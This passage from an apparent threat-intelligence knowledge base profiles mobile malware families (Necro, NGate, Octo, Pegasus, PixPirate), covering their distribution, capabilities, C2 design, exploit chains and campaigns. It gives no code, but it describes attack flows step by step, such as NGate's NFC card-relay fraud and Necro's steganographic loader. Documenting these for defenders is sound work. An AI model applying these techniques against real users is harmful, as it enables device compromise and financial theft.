background.</p>"},{"location":"malware/families/necro/","title":"Necro","text":"<p>Necro is a trojan downloader that infiltrated Google Play through compromised advertising SDKs embedded in legitimate applications. Kaspersky documented the 2024 resurgence, finding the trojan inside Wuta Camera (10M+ installs) and Max Browser (1M+ installs) through a malicious SDK called \"Coral SDK.\" The family is notable for using image steganography to hide payloads in PNG files, a technique rarely seen in Android malware. Total affected installs exceeded 11 million through official Google Play distribution alone.</p>"},{"location":"malware/families/necro/#overview","title":"Overview","text":"Attribute Details First Seen 2019 (first variant), 2024 (Play Store resurgence) Last Seen Active Status Active, distribution through compromised SDKs Type Trojan downloader, adware, proxy Attribution Unknown Aliases Necro Trojan, NecroBot"},{"location":"malware/families/necro/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Downloader.AndroidOS.Necro ESET Android/TrojanDownloader.Necro McAfee Android/Necro Bitdefender Android.Trojan.Downloader.Necro"},{"location":"malware/families/necro/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Necro has no direct code lineage to other documented banking trojan families. It operates as a modular downloader platform rather than a credential-stealing trojan. The 2024 variant represents a significant evolution from earlier versions, with the addition of steganography-based payload delivery and distribution through compromised SDKs in legitimate apps.</p> <p>The supply chain approach mirrors Triada's strategy of embedding in legitimate software to reach massive install bases, though Necro operates at the SDK level rather than the firmware level.</p>"},{"location":"malware/families/necro/#distribution","title":"Distribution","text":"<p>Necro reaches users through two vectors: compromised legitimate apps on Google Play and modified APKs distributed through unofficial channels.</p>"},{"location":"malware/families/necro/#google-play-sdk-compromise","title":"Google Play (SDK Compromise)","text":"App Downloads SDK Wuta Camera 10M+ Coral SDK embedded in advertising module Max Browser 1M+ Coral SDK <p>The developers of these apps were likely unaware of the malicious SDK. The Coral SDK presented itself as a legitimate advertising component but contained obfuscated loader code. This mirrors the Goldoson supply chain vector where malicious SDKs are embedded in otherwise legitimate applications.</p>"},{"location":"malware/families/necro/#unofficial-channels","title":"Unofficial Channels","text":"<p>Modified versions of popular apps (Spotify mods, WhatsApp mods, Minecraft mods, game mods) distributed through third-party sites also contained Necro. These modded APKs are repackaged with the trojan loader and distributed through forums, Telegram channels, and mod sites.</p>"},{"location":"malware/families/necro/#capabilities","title":"Capabilities","text":"Capability Description Steganographic payload delivery Hides second-stage payloads in PNG image files Invisible ad display Loads and renders ads in invisible WebView windows Arbitrary DEX download Downloads and executes additional DEX modules from C2 Proxy tunneling Routes third-party traffic through infected devices Subscription fraud Attempts WAP billing subscriptions via invisible browser JavaScript execution Executes arbitrary JavaScript in hidden WebView contexts"},{"location":"malware/families/necro/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/necro/#steganography-loader","title":"Steganography Loader","text":"<p>The most notable technical feature is payload concealment within PNG images. The loader:</p> <ol> <li>Downloads a PNG image from C2 infrastructure</li> <li>Extracts hidden data from the image's pixel values using a custom steganographic algorithm</li> <li>Decodes the extracted data into a JAR/DEX payload</li> <li>Loads and executes the payload via DexClassLoader</li> </ol> <p>This technique evades network-level inspection since the download appears to be a standard image file. Traditional network monitoring tools see an HTTP request for a PNG, not a malware download.</p>"},{"location":"malware/families/necro/#modular-architecture","title":"Modular Architecture","text":"<p>Necro operates as a plugin platform. The base loader fetches and executes modules with different functions:</p> Module Function Adware module Loads ads in invisible WebViews, generates fraudulent ad revenue Proxy module Establishes SOCKS/HTTP proxy on victim device for traffic tunneling Download module Fetches and installs additional APKs Subscription module Automates WAP billing fraud via hidden browser"},{"location":"malware/families/necro/#coral-sdk-obfuscation","title":"Coral SDK Obfuscation","text":"<p>The Coral SDK uses multiple layers of obfuscation:</p> <ul> <li>Native library loader (obfuscated .so file)</li> <li>String encryption throughout Java/Kotlin code</li> <li>Dynamic class loading to hide actual functionality</li> <li>Legitimate-appearing advertising API surface</li> </ul>"},{"location":"malware/families/necro/#target-regions","title":"Target Regions","text":"<p>Necro is not region-specific. The supply chain distribution via Google Play apps means infections follow the app's global user base. Kaspersky detected infections across multiple continents, with the highest concentrations in countries with large Android user bases.</p>"},{"location":"malware/families/necro/#notable-campaigns","title":"Notable Campaigns","text":"<p>2019: First Necro variants appear, primarily distributed through unofficial app stores and modded APKs. Limited impact compared to later campaigns.</p> <p>2024, August: Kaspersky discovers Necro inside Google Play apps through the Coral SDK. Wuta Camera (10M+ installs) and Max Browser (1M+ installs) identified as carriers. The trojan uses image steganography for payload delivery, a first for large-scale Play Store malware. Kaspersky works with Google to remove affected apps. Additional distribution through modded Spotify, WhatsApp, and Minecraft APKs on unofficial channels is documented.</p>"},{"location":"malware/families/ngate/","title":"NGate","text":"<p>NGate is the first Android malware to use NFC relay attacks to clone victims' physical payment cards and withdraw cash from ATMs. ESET discovered the family in August 2024, tracing active campaigns back to November 2023 targeting clients of Czech banks. The malware repurposes NFCGate, an open-source NFC research tool developed at the Technical University of Darmstadt, to capture NFC data from a victim's payment card and relay it in real time to an attacker's rooted Android device. That device then emulates the cloned card to perform contactless ATM withdrawals. Although the primary suspect was arrested in March 2024 and the original campaign ceased, NGate's technique proved highly influential. ESET's H2 2025 threat report documented an 87% increase in NFC-targeting Android threats, with successors like GhostTap and SuperCard building directly on the approach NGate pioneered.</p>"},{"location":"malware/families/ngate/#overview","title":"Overview","text":"Attribute Details First Seen November 2023 (campaign start); March 2024 (malware samples identified) Last Seen March 2024 (suspect arrested, campaign ceased) Status Inactive (original campaign); technique spawned active successors Type NFC relay malware, banking fraud Attribution Unknown, one suspect arrested in Czech Republic Distribution Malicious PWAs (Progressive Web Apps) and WebAPKs"},{"location":"malware/families/ngate/#origin-and-lineage","title":"Origin and Lineage","text":"<p>NGate has no lineage to existing Android banking trojan families. Its technical foundation comes from NFCGate, an academic tool created by researchers at TU Darmstadt for NFC security testing and analysis. NFCGate is designed to capture, analyze, and relay NFC traffic between devices for legitimate research purposes. NGate's developers repurposed the relay functionality for criminal use, packaging it into a malicious app distributed to victims under the guise of banking applications.</p> <p>ESET's analysis confirmed that no prior mobile malware had implemented NFC relay for financial fraud. NGate represented an entirely new attack category on the mobile platform.</p> <p>The technique has since been adopted and extended by multiple successors. GhostTap applies the NFC relay concept at broader scale, SuperCard focuses on contactless payment fraud, and RatOn (documented by ThreatFabric) combines NFC relay with Automated Transfer Systems (ATS) for a hybrid approach.</p>"},{"location":"malware/families/ngate/#distribution","title":"Distribution","text":"<p>NGate campaigns used Progressive Web Apps (PWAs) and WebAPKs as the initial delivery mechanism, a technique that was novel at the time and has since become more common in mobile phishing.</p> Vector Details Malicious PWAs Progressive Web Apps impersonating Czech banking portals, installed via browser prompts WebAPKs Chrome-generated APKs from PWA manifests, appearing more legitimate than sideloaded apps Smishing SMS messages directing victims to phishing pages that prompt PWA installation Social engineering Victims instructed to tap their physical payment card against their phone after installation"},{"location":"malware/families/ngate/#attack-flow","title":"Attack Flow","text":"<ol> <li>Victim receives a smishing message impersonating their Czech bank</li> <li>The link leads to a phishing page that prompts installation of a PWA or WebAPK</li> <li>The installed app mimics the bank's interface and requests banking credentials</li> <li>The app instructs the victim to enable NFC and tap their physical payment card against their phone \"for verification\"</li> <li>NGate captures the NFC data from the payment card via the device's NFC reader</li> <li>The captured NFC data is relayed in real time to the attacker's rooted Android device</li> <li>The attacker's device emulates the cloned card using the relayed NFC data</li> <li>The attacker performs a contactless withdrawal at an ATM using the emulated card</li> </ol> <p>The social engineering component is critical: the victim must physically hold their payment card against their phone's NFC reader. The fake banking app provides a convincing UI that makes this action appear to be a standard verification step.</p>"},{"location":"malware/families/ngate/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/ngate/#core-features","title":"Core Features","text":"Capability Implementation NFC relay Captures NFC data from victim's physical card and relays it to attacker's device in real time Card emulation Attacker's rooted device emulates the cloned card for contactless transactions Credential phishing Fake banking interface collects login credentials, client IDs, dates of birth PIN capture Social engineering prompts victim to enter their card PIN within the fake app ATM cash withdrawal Attacker uses emulated card data at contactless-enabled ATMs"},{"location":"malware/families/ngate/#nfcgate-integration","title":"NFCGate Integration","text":"<p>NGate integrates the relay component of NFCGate directly into its APK. The original NFCGate tool requires two devices: a \"reader\" that captures NFC data and a \"server\" that receives the relayed data. In NGate's implementation:</p> <ul> <li>The victim's infected device acts as the reader</li> <li>The attacker's rooted Android device acts as the server, receiving NFC data over the internet</li> <li>The attacker's device uses host-based card emulation (HCE) to present the cloned card data to an ATM's NFC reader</li> </ul>"},{"location":"malware/families/ngate/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/ngate/#nfc-relay-mechanism","title":"NFC Relay Mechanism","text":"<p>The NFC relay is the core technical innovation. When the victim taps their payment card against their phone:</p> Step Technical Detail Capture Device NFC reader captures the card's NFC communication (ISO 14443) Relay NFCGate component forwards raw NFC data to attacker's server over HTTPS Emulation Attacker's rooted device receives data and emulates the card via HCE Transaction Emulated card presented to ATM NFC reader for contactless withdrawal <p>The relay happens in real time, meaning the card data does not need to be stored. The attacker must perform the ATM withdrawal while the victim's card is actively being read. This creates a time-sensitive operation but avoids leaving persistent card data on either device.</p>"},{"location":"malware/families/ngate/#pwa-and-webapk-delivery","title":"PWA and WebAPK Delivery","text":"<p>The use of PWAs and WebAPKs for distribution was tactically significant:</p> Delivery Type Advantage PWA Bypasses Play Store entirely, no APK sideloading warnings, installs via browser WebAPK Chrome generates a real APK from the PWA manifest, appears in app drawer like a native app Combined Victims see what looks like a legitimate banking app without triggering Android's sideloading protections"},{"location":"malware/families/ngate/#limitations","title":"Limitations","text":"<p>NGate had practical constraints that limited its scale:</p> Constraint Detail Physical card required Victim must physically tap their payment card against the phone Real-time operation Attacker must be at an ATM during the relay session Rooted device required Attacker's emulation device needs root access for HCE Contactless ATM required Target ATM must support NFC-based withdrawals PIN dependency Attacker needs the victim's PIN (captured via phishing) for ATM transactions"},{"location":"malware/families/ngate/#target-regions","title":"Target Regions","text":"Region Details Czech Republic Sole target of the original NGate campaigns <p>NGate's geographic scope was limited to Czech bank clients. The phishing pages and PWAs impersonated specific Czech banking institutions. ESET confirmed that all identified victims were customers of Czech banks.</p> <p>Despite the narrow geographic focus, the technique is universally applicable. Any country with contactless-enabled ATMs and NFC-equipped payment cards is vulnerable to the same approach, which explains why successors have expanded the targeting.</p>"},{"location":"malware/families/ngate/#notable-campaigns","title":"Notable Campaigns","text":"<p>November 2023: The NGate campaign begins targeting Czech bank clients through smishing messages and malicious PWAs. Victims are tricked into installing fake banking apps and tapping their payment cards against their phones.</p> <p>March 2024: Czech police arrest a suspect connected to the NGate operation. The arrest ends the active campaign. At the time of arrest, the suspect had been withdrawing cash from ATMs in Prague using NFC data relayed from victims' devices.</p> <p>August 2024: ESET publishes the full technical analysis of NGate, revealing the NFC relay technique to the security community. The research identifies NGate as the first mobile malware to weaponize NFC relay for financial fraud and details the use of NFCGate as the underlying framework.</p> <p>2025: ESET's H2 2025 threat report documents an 87% year-over-year increase in NFC-targeting Android threats. The report attributes this growth directly to the blueprint NGate established, with multiple new families adopting and extending the NFC relay approach.</p>"},{"location":"malware/families/ngate/#related-families","title":"Related Families","text":"<p>NGate pioneered the NFC relay attack category on mobile, and several successors have built on the technique. GhostTap expanded the concept for broader geographic targeting and higher-volume operations. SuperCard focuses specifically on contactless payment fraud using relayed card data. RatOn, documented by ThreatFabric, represents the most advanced evolution by combining NFC relay with Automated Transfer Systems (ATS), enabling both NFC-based card cloning and on-device fraud within a single malware package.</p> <p>The PWA-based distribution method NGate used has also been adopted by other campaigns. MoqHao and other smishing-focused families have experimented with PWA delivery as an alternative to traditional APK sideloading.</p> <p>NGate's approach differs fundamentally from overlay-based banking trojans like Octo or Hook, which perform on-device fraud by remotely controlling the victim's banking app. NGate bypasses digital banking entirely by targeting the physical payment card, moving the fraud to the ATM rather than the mobile banking interface.</p>"},{"location":"malware/families/octo/","title":"Octo","text":"<p>Octo is an Android banking trojan descended from the Exobot lineage (2016), offering remote access via real-time screen streaming using Android's MediaProjection API. Sold as malware-as-a-service (MaaS) on underground forums, it provides operators with on-device fraud (ODF) capability through a combination of screen streaming at 1 frame per second, accessibility-driven input simulation, and overlay injection. Its 2024 successor, Octo2, introduced DGA-based C2 resolution and improved anti-analysis, responding to a source code leak that spawned competing forks.</p>"},{"location":"malware/families/octo/#overview","title":"Overview","text":"Attribute Details First Seen 2022 (as Octo); 2021 (as Coper); 2018 (as ExobotCompact); 2016 (as Exobot) Status Active (Octo2, 2024-present) Type Banking trojan, MaaS, RAT Aliases ExobotCompact, Coper Attribution Threat actor \"Architect\" / \"goodluck\" (forum handles) Distribution Google Play droppers, sideloading, third-party stores"},{"location":"malware/families/octo/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Octo has the most thoroughly documented lineage of any modern Android banking trojan. ThreatFabric traced the full evolution from Exobot through ExobotCompact to Octo:</p> <p>Exobot (2016-2018): A full-featured banking trojan targeting financial institutions globally. The original author ceased development around 2018.</p> <p>ExobotCompact (2018-2021): A lightweight version created by a threat actor using the handle \"android\" on dark web forums. Stripped down from the original Exobot, it retained core banking trojan features but with a smaller footprint.</p> <p>Coper (2021): Some AV vendors independently discovered ExobotCompact samples in 2021 and tracked them under the name \"Coper.\" ThreatFabric proved that Coper and ExobotCompact were the same family.</p> <p>Octo (2022): In January 2022, ThreatFabric analysts spotted forum posts seeking the \"Octo Android botnet.\" Investigation revealed that ExobotCompact had been updated with remote access capabilities and rebranded as Octo. The rebrand accompanied a transition to a MaaS model under the operator \"Architect\" (also known as \"goodluck\").</p> <p>Octo2 (2024): Following a source code leak of Octo1 that spawned unauthorized forks, the original author released Octo2 with significant improvements to DGA, anti-analysis, and remote access stability.</p> <p>Possible Coper Descendants: Frogblight, a Turkish banking trojan discovered in 2025, shows possible connections to the Coper MaaS ecosystem according to Kaspersky's analysis. If confirmed, it would represent another branch of the Exobot lineage operating independently from Octo.</p>"},{"location":"malware/families/octo/#distribution","title":"Distribution","text":"Vector Details Google Play droppers Fake apps (fast cleaner, play store, etc.) uploaded to Google Play Third-party app stores APKs distributed through unofficial markets Smishing SMS campaigns directing victims to download pages MaaS affiliates Operators receive builder access and distribute through their own channels <p>ThreatFabric documented multiple Google Play dropper campaigns, including a \"Fast Cleaner\" app with 50,000+ installs that delivered Octo as its payload.</p>"},{"location":"malware/families/octo/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/octo/#version-evolution","title":"Version Evolution","text":"Version Period Key Capabilities ExobotCompact 2018-2021 Overlay injection, SMS interception, keylogging, notification blocking Octo (v1) 2022-2024 All above + MediaProjection screen streaming, accessibility remote control, black screen hiding Octo2 2024-present All above + DGA for C2, dynamic key generation, improved obfuscation, enhanced remote access stability"},{"location":"malware/families/octo/#core-features","title":"Core Features","text":"Capability Implementation Screen streaming MediaProjection API captures screenshots at 1/sec, streamed to operator Remote input Accessibility service simulates taps, swipes, gestures, text input Overlay injection WebView-based injects triggered by target app detection Keylogging Captures PINs, URLs visited, clicks, focus changes, text edits SMS interception Reads, sends, and mutes incoming SMS Notification blocking Suppresses notifications from specified apps App launching Opens arbitrary apps on command Screen lock control Locks/unlocks device, mutes audio Black screen overlay Displays black screen and dims brightness to zero to hide remote operations"},{"location":"malware/families/octo/#remote-access-odf","title":"Remote Access (ODF)","text":"<p>The remote access capability is what elevated Octo above standard overlay-only trojans. The implementation:</p> <ol> <li>MediaProjection captures the screen as compressed screenshots at ~1 frame per second</li> <li>Screenshots are streamed to the operator's panel over the C2 channel</li> <li>The operator sees near-real-time device state and sends commands back</li> <li>Accessibility service executes the commands as taps, swipes, and text input</li> <li>A black screen overlay with zero brightness hides the activity from the victim</li> </ol> <p>This creates an interactive remote session within the victim's device, allowing the operator to navigate banking apps, initiate transfers, and confirm transactions as if holding the phone.</p>"},{"location":"malware/families/octo/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/octo/#c2-communication","title":"C2 Communication","text":"<p>Octo v1:</p> Component Details Encryption AES with hardcoded static key Encoding Base64 over AES ciphertext Protocol HTTPS C2 resolution Hardcoded domains <p>Octo2:</p> Component Details Encryption AES with per-request dynamically generated keys Key exchange Cryptographic salt shared in request, C2 derives matching key Protocol HTTPS C2 resolution Domain Generation Algorithm (DGA) <p>ThreatFabric's Octo2 analysis details the improvements: instead of a static hardcoded key, each request generates a fresh encryption key. The salt is included in the request body so the C2 can independently derive the same key for decryption.</p>"},{"location":"malware/families/octo/#octo2-dga","title":"Octo2 DGA","text":"<p>The DGA generates C2 domain names dynamically, allowing operators to rotate infrastructure without rebuilding samples. ThreatFabric documented the implementation: a native library decrypts the malicious payload at runtime, generates encryption keys, and produces C2 domain names through the DGA algorithm.</p>"},{"location":"malware/families/octo/#anti-analysis-octo2","title":"Anti-Analysis (Octo2)","text":"Technique Details Multi-stage loading Native library decrypts and loads payload dynamically Code obfuscation More sophisticated than Octo1, multiple decryption layers DGA Eliminates static C2 indicators Dynamic key derivation Per-request encryption keys defeat traffic replay"},{"location":"malware/families/octo/#maas-infrastructure","title":"MaaS Infrastructure","text":"<p>Octo operates as a full MaaS platform:</p> <ul> <li>Panel: Web-based operator interface for managing bots, viewing screen streams, sending commands</li> <li>Builder: Generates customized APKs with operator-specific C2 configuration</li> <li>Inject hosting: C2 serves WebView-based overlays for target apps</li> <li>Bot management: Track infected devices, filter by country/installed apps</li> </ul> <p>Team Cymru documented the MaaS infrastructure from a network intelligence perspective, mapping C2 servers and operator panels.</p>"},{"location":"malware/families/octo/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"Period Primary Targets 2021-2022 (Coper/ExobotCompact) Latin America, Europe 2022-2024 (Octo) Global, operator-dependent (MaaS) 2024 (Octo2) Italy, Poland, Moldova, Hungary (initial campaigns) <p>As a MaaS operation, Octo's targeting depends on individual operators. The platform provides inject kits covering banking apps across multiple regions, but each affiliate selects their own targets.</p>"},{"location":"malware/families/octo/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2022: ThreatFabric identified Octo on dark web forums and linked it to ExobotCompact, documenting the full lineage from Exobot. A \"Fast Cleaner\" app on Google Play with 50,000+ installs was identified as an Octo dropper.</p> <p>2022-2023: Team Cymru tracked Octo's MaaS infrastructure and documented increasing operator activity, with more campaigns and more affiliates gaining access to the platform.</p> <p>Early 2024: The Octo1 source code leaked, leading to multiple unauthorized forks by third-party actors. This fragmentation of the ecosystem likely motivated the original author to release Octo2.</p> <p>September 2024: ThreatFabric disclosed Octo2 with campaigns already targeting European banks in Italy, Poland, Moldova, and Hungary. Initial samples impersonated NordVPN and Google Chrome. The author offered Octo2 to existing Octo1 customers at the same price with early access.</p>"},{"location":"malware/families/pegasus/","title":"Pegasus","text":"<p>Pegasus is the most well-documented mobile surveillance tool ever deployed. Developed by Israel's NSO Group, it provides operators with complete device compromise through zero-click exploit chains that require no interaction from the target. Sold exclusively to government clients under the label of \"lawful intercept,\" Pegasus has been found on the devices of journalists, human rights defenders, opposition politicians, and heads of state across dozens of countries. Its Android variant, internally called Chrysaor by Google, mirrors most iOS capabilities while adapting to the Android security model.</p>"},{"location":"malware/families/pegasus/#overview","title":"Overview","text":"Attribute Details First Seen August 2016 (public discovery) Status Active, continuously updated Type Commercial spyware (government-exclusive) Attribution NSO Group Technologies (Herzliya, Israel) Aliases Chrysaor (Google/Android), Trident (iOS exploit chain, 2016), Q Suite (marketing name) Platforms iOS, Android"},{"location":"malware/families/pegasus/#origin-and-lineage","title":"Origin and Lineage","text":"<p>NSO Group was founded in 2010 by Niv Carmi, Shalev Hulio, and Omri Lavie, all with backgrounds in Israeli intelligence. The company operates under the claim that it sells only to vetted government agencies for counter-terrorism and law enforcement. Pegasus is the flagship product, though NSO also markets other tools under different names.</p> <p>The first public evidence of Pegasus emerged in August 2016 when UAE human rights defender Ahmed Mansoor received SMS messages containing exploit links. Rather than clicking, Mansoor forwarded them to Citizen Lab researchers, who published \"The Million Dollar Dissident\" in collaboration with Lookout Security. The analysis revealed a chain of three iOS zero-days (dubbed Trident) capable of remotely jailbreaking a stock iPhone 6.</p> <p>Lookout subsequently published a technical analysis of the Android variant in April 2017, designating it Chrysaor. The Android version does not rely on zero-days for rooting: it uses the Framaroot technique, a well-known set of Android root exploits. If rooting fails, it requests accessibility permissions to achieve data exfiltration through above-board APIs.</p>"},{"location":"malware/families/pegasus/#distribution","title":"Distribution","text":"<p>Pegasus delivery has evolved significantly over its lifetime, moving from one-click social engineering to fully remote zero-click exploitation.</p> Era Delivery Method Exploit Chain 2016 SMS with exploit link Trident: CVE-2016-4655 (KASLR bypass), CVE-2016-4656 (kernel exploit), CVE-2016-4657 (WebKit RCE) 2017-2018 Spear-phishing links via SMS, WhatsApp Various browser and kernel chains 2019 WhatsApp zero-day voice call CVE-2019-3568: buffer overflow in WhatsApp VOIP stack, no answer required 2020 Zero-click iMessage KISMET: exploited iMessage on iOS 13.5.1-13.7, discovered targeting Al Jazeera journalists 2021 Zero-click iMessage FORCEDENTRY: CVE-2021-30860, JBIG2 integer overflow in CoreGraphics PDF parser, bypassed BlastDoor sandbox 2022 Zero-click iMessage Three new chains exploiting iOS 15 and iOS 16, including PWNYOURHOME and FINDMYPWN <p>On Android, delivery typically involves a one-click link that downloads the implant APK. The operator sends a crafted SMS or message through any app. When the target taps the link, the browser redirects through an exploit server that either exploits a browser vulnerability or simply serves the APK with social engineering to encourage installation.</p> <p>For ISP-level deployment (documented in several countries), operators with access to network infrastructure can inject redirects into unencrypted HTTP traffic, pushing the malicious download without the need for phishing messages.</p>"},{"location":"malware/families/pegasus/#capabilities","title":"Capabilities","text":"<p>Once installed, Pegasus provides total device access. The implant operates as a persistent rootkit with the following capabilities:</p>"},{"location":"malware/families/pegasus/#data-collection","title":"Data Collection","text":"Category Details Messages SMS, MMS, iMessage, email (before and after encryption in E2E apps) Messaging apps WhatsApp, Telegram, Signal, Facebook Messenger, Viber, Skype (reads from local databases) Calls Live call recording and call log extraction Camera Silent activation of front and rear cameras Microphone Ambient audio recording, room tap functionality Location GPS, cell tower, Wi-Fi-based positioning with historical tracking Passwords Keychain/keystore extraction, stored Wi-Fi credentials Contacts Full address book exfiltration Calendar Calendar events and meeting details Files Browse and exfiltrate arbitrary files from device storage Browser History, bookmarks, saved passwords"},{"location":"malware/families/pegasus/#android-specific-behavior-chrysaor","title":"Android-Specific Behavior (Chrysaor)","text":"<p>The Android implant documented by Lookout and Cyber Geeks uses a layered approach:</p> Component Function Framaroot exploits Root the device using known kernel exploits (named after Lord of the Rings characters) Fallback mode If root fails, request accessibility and usage access permissions to exfiltrate data through Android APIs Self-destruct Remove itself if it detects it cannot operate covertly, if it has not contacted C2 within 60 days, or if it detects analysis Screenshot capture Framebuffer reading (rooted) or MediaProjection (non-rooted) Live audio Record calls and ambient audio via native audio APIs"},{"location":"malware/families/pegasus/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/pegasus/#c2-infrastructure","title":"C2 Infrastructure","text":"<p>Pegasus uses an anonymizing relay network for command and control. Citizen Lab mapped C2 infrastructure across 45 countries by fingerprinting the distinctive TLS certificates and HTTP responses of Pegasus installation servers. The C2 architecture routes through multiple proxy layers, making attribution to the operating government technically difficult but not impossible through DNS and infrastructure analysis.</p> <p>Exfiltrated data is transmitted over HTTPS, encrypted with unique per-device keys. The implant polls C2 for tasking commands and uploads collected data on a schedule or on-demand.</p>"},{"location":"malware/families/pegasus/#persistence","title":"Persistence","text":"<p>On rooted Android devices, Pegasus installs itself in system partitions and survives factory resets. On non-rooted devices, it leverages device administrator privileges and accessibility services to maintain presence, reinstalling itself if the user attempts removal.</p>"},{"location":"malware/families/pegasus/#forcedentry-the-benchmark-exploit","title":"FORCEDENTRY: The Benchmark Exploit","text":"<p>Google Project Zero published a detailed technical analysis of FORCEDENTRY, calling it \"one of the most technically sophisticated exploits we've ever seen.\" The exploit chain:</p> <ol> <li>Sends a PDF file disguised as a GIF through iMessage</li> <li>Triggers an integer overflow in the JBIG2 decoder within Apple's CoreGraphics</li> <li>Constructs a small CPU architecture from JBIG2 logical operations, building a Turing-complete virtual machine from a decompression codec</li> <li>Escapes the BlastDoor iMessage sandbox introduced in iOS 14</li> <li>Achieves kernel code execution and installs the Pegasus implant</li> </ol> <p>This demonstrated a level of exploit engineering previously assumed to be exclusive to top-tier nation-state programs.</p>"},{"location":"malware/families/pegasus/#known-deployments-and-targets","title":"Known Deployments and Targets","text":"<p>Citizen Lab identified suspected Pegasus operators in 45 countries as of 2018. The Pegasus Project investigation in 2021, coordinated by Forbidden Stories with technical support from Amnesty International's Security Lab, revealed a leaked list of over 50,000 phone numbers selected as potential targets by NSO clients.</p> Country/Client Known Targets United Arab Emirates Ahmed Mansoor (human rights defender), journalists, activists Saudi Arabia Associates of Jamal Khashoggi (before his assassination), women's rights activists, Al Jazeera journalists Mexico Journalists investigating cartel corruption, lawyers, anti-corruption activists, scientists advocating sugar tax Morocco French journalists, Moroccan activists, French politicians including Emmanuel Macron's phone number on the list India Journalists, opposition politicians, lawyers, activists Hungary Investigative journalists, media owners Poland Opposition politicians, prosecutors Bahrain Activists, documented by Citizen Lab Rwanda Journalists, opposition figures El Salvador Journalists from El Faro"},{"location":"malware/families/pegasus/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>August 2016: Citizen Lab and Lookout publish \"The Million Dollar Dissident\", revealing the Trident exploit chain used against Ahmed Mansoor. Apple patches the three iOS zero-days within ten days. This is the first public documentation of Pegasus.</p> <p>April 2017: Lookout publishes the Chrysaor (Pegasus for Android) technical analysis, documenting the Framaroot-based rooting approach and the fallback non-root exfiltration mode.</p> <p>September 2018: Citizen Lab publishes \"Hide and Seek\", mapping suspected Pegasus operators in 45 countries through Internet scanning of C2 infrastructure.</p> <p>May 2019: WhatsApp discloses CVE-2019-3568, a buffer overflow in the VOIP call stack exploited by NSO to install Pegasus. No user interaction required: the exploit triggered via a missed call. WhatsApp (Meta) subsequently files a federal lawsuit against NSO Group.</p> <p>October 2019: Google Project Zero's analysis of CVE-2019-2215 (Bad Binder), a use-after-free in Android's Binder IPC, was linked to NSO Group's Pegasus delivery on Android devices including Pixel, Samsung, Huawei, and Xiaomi.</p> <p>December 2020: Citizen Lab reveals the KISMET exploit, a zero-click iMessage chain used to compromise phones of 36 Al Jazeera journalists. The exploit targeted iOS 13.5.1 through 13.7 and stopped working against iOS 14's BlastDoor mitigation.</p> <p>July 2021: The Pegasus Project publishes across 17 media organizations in 10 countries. Amnesty International's Security Lab releases the forensic methodology report and the Mobile Verification Toolkit (MVT), an open-source tool for checking devices for Pegasus indicators. Citizen Lab peer-reviews and validates Amnesty's methodology.</p> <p>September 2021: Citizen Lab captures the FORCEDENTRY exploit in the wild on a Saudi activist's phone. Apple patches CVE-2021-30860 and credits Citizen Lab. This is the first time a zero-click exploit for iMessage is captured as a complete artifact.</p> <p>December 2021: Google Project Zero publishes their deep dive into FORCEDENTRY, describing the JBIG2-based virtual machine as an unprecedented exploitation technique.</p> <p>November 2021: The U.S. Commerce Department adds NSO Group to the Entity List, restricting exports of U.S. technology to the company.</p> <p>April 2023: Citizen Lab documents three new zero-click exploit chains used in 2022 against civil society targets in Mexico, including PWNYOURHOME (targeting HomeKit and iMessage on iOS 15 and 16) and FINDMYPWN (targeting Find My and iMessage on iOS 15).</p> <p>October 2019 - present: Citizen Lab continues documenting new abuse cases, with over 100 identified across multiple countries.</p>"},{"location":"malware/families/pixpirate/","title":"PixPirate","text":"<p>PixPirate is a Brazilian banking trojan built to exploit Pix, Brazil's instant payment platform used by over 100 million accounts. First documented by Cleafy in February 2023, the malware performs Automated Transfer System (ATS) fraud through accessibility services, initiating Pix transfers from the victim's banking app without user interaction. PixPirate introduced a novel stealth technique: the main payload has no launcher icon and no main activity, making it invisible in the app drawer. This is the first financial malware family observed using this method, which bypasses Android 10+ restrictions that previously stopped malware from hiding its icon.</p>"},{"location":"malware/families/pixpirate/#overview","title":"Overview","text":"Attribute Details First Seen Late 2022 Status Active Type Banking trojan, ATS fraud Attribution Unknown, Brazilian-origin operation Aliases PixPirate"},{"location":"malware/families/pixpirate/#origin-and-lineage","title":"Origin and Lineage","text":"<p>PixPirate was discovered by Cleafy's Threat Intelligence and Response (TIR) team between late 2022 and early 2023. It belongs to the generation of Android banking trojans that leverage ATS for on-device fraud, joining families like Anatsa, SharkBot, and Xenomorph in automating the entire transaction flow through accessibility services.</p> <p>PixPirate is distinct in its specialization. Rather than targeting a broad set of banking apps across multiple countries, it focuses exclusively on Pix, the real-time payment system operated by Brazil's Central Bank. Pix processes transactions instantly and irreversibly, making it an ideal target for automated fraud: once a transfer completes, the money is gone. The malware was built ground-up for this purpose, with JavaScript modules tailored to each targeted bank's Pix transfer interface.</p> <p>IBM Security Trusteer researchers later published extended analysis covering the dropper-payload architecture and the innovative icon-hiding technique.</p>"},{"location":"malware/families/pixpirate/#distribution","title":"Distribution","text":"<p>PixPirate uses a two-component distribution model: a separate dropper app and a payload app.</p>"},{"location":"malware/families/pixpirate/#dropper-downloader","title":"Dropper (Downloader)","text":"Attribute Details Distribution Smishing campaigns, WhatsApp spam from infected devices Store presence Not on Google Play Function Downloads or unpacks the payload APK, requests accessibility permissions Persistence Can be uninstalled without affecting the payload"},{"location":"malware/families/pixpirate/#payload-droppee","title":"Payload (Droppee)","text":"Attribute Details Distribution Installed by the dropper Store presence Not on Google Play Launcher icon None, completely invisible in app drawer Main activity No <code>android.intent.action.MAIN</code> / <code>android.intent.category.LAUNCHER</code> Activation Triggered via exported service that the dropper binds to <p>The payload intentionally lacks a launcher activity. On Android 10+, apps without a launcher activity do not display an icon in the app drawer, but this previously caused them to be non-functional since there was no way to launch them. PixPirate solved this by exporting a service that the dropper connects to, allowing the dropper to trigger the payload without a launcher entry.</p> <p>Even if the user uninstalls the dropper, the payload persists and can activate based on device events such as boot completion, connectivity changes, or other broadcast 